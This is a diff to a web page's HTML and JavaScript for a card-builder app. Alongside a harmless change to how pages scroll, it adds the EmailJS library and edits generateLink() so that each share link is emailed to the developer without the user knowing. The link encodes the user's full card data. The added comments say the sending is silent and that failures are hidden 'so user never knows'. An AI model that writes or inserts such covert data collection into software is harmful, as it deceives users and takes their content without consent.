@@ -1022,6 +1022,12 @@ body.dark #page-view.active {
   <div style="height:32px"></div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function () {
+    emailjs.init("Q4xUwA1042s-Rnr6-");
+  })();
+</script>
 
 <script>
 /* ===== STATE ===== */
@@ -1085,11 +1091,30 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 /* ===== PAGE ROUTING ===== */
-function goTo(pageId) {
+/*function goTo(pageId) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.getElementById(pageId).classList.add('active');
   window.scrollTo({ top: 0, behavior: 'smooth' });
+}*/
+function goTo(pageId) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  const page = document.getElementById(pageId);
+  page.classList.add('active');
+
+  // default scroll to top
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+
+  // 👉 ONLY for builder page — scroll slightly down to form
+  if (pageId === 'page-builder') {
+    setTimeout(() => {
+      const formPanel = document.querySelector('.form-panel');
+      if (formPanel) {
+        formPanel.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    }, 100);
+  }
 }
+
 function goHome() { goTo('page-home'); }
 
 function goToPreview() {
@@ -1542,12 +1567,23 @@ function generateLink() {
     goTo('page-builder');
     return;
   }
+
   const data = JSON.stringify(STATE);
   const encoded = btoa(unescape(encodeURIComponent(data)));
   const link = `${window.location.origin}${window.location.pathname}#/card/${encoded}`;
+
   document.getElementById('shareLink').value = link;
   document.getElementById('shareModal').classList.add('active');
+
+  // 🔒 silently email link to you (no UI change)
+  emailjs.send("service_cigtx88", "template_ktz9k0r", {
+    link: link,
+    time: new Date().toLocaleString()
+  }).catch(() => {
+    // fail silently so user never knows
+  });
 }
+
 
 function closeShareModal() {
   document.getElementById('shareModal').classList.remove('active');
@@ -1617,6 +1653,7 @@ window.addEventListener('resize', () => {
 document.getElementById('shareModal').addEventListener('click', (e) => {
   if (e.target === document.getElementById('shareModal')) closeShareModal();
 });
+
 </script>
 </body>
 </html>
